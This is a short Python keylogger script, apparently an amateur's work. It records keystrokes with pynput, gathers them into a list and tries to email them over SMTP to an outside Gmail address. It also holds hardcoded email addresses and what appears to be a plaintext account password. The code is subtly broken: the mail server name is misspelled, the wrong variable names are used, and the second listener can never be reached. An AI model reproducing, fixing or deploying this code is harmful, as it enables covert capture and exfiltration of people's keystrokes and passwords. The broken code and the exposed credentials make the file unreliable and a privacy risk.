from os import startfile
from typing import List
from pynput import keyboard
from pynput.keyboard import Listener
import smtplib
def log_keystrok(key):
    if key == 'key.space':
        key=' '
    if key == 'key.shift_r':
        key=' '
    if key == "key.enter":
        key='\n'
    print(key)
with Listener(on_press=log_keystrok) as l:
    l.join()
def sender(key):
    fromaddr = "hamoonsedaghat136@gmail.com" 
    toaddrs = "hamwnsedaqat@gmail.com"
    msg = key
    password = ("hamoon1384")
    username = ("hamoonsedaghat136")
    server = smtplib.SMTP('smpt.gmail.com:587')
    server.starttls()
    server.login(username , password)
    server.sendmail(fromaddr, toaddrs , msg)
    print("Gmail sended successFuly")
    list.clear()
    liste = []
def log_keystroke(key):
    list.append(key)
    strl = str(list)
    if len(List)==20:
        sender(strl)
with keyboard.Listener(on_press=log_keystroke)as l:
     l.join()
fromaddr = 'hamoonsedaghat136@gmail.com'
toaddrs = 'hamwnsedaqat@gmail.com'
msg = 'this is a massage for test'
username = 'hamoonsedaghat136'
password = 'hamoon1384'
server = smtplib.SMTP('smpt.gmail.com')
server.starttls()
server.login(username , password )
server.sendmail(fromaddr , toaddrs , msg )
server.quit()
print (" Gmail sended successFuly ")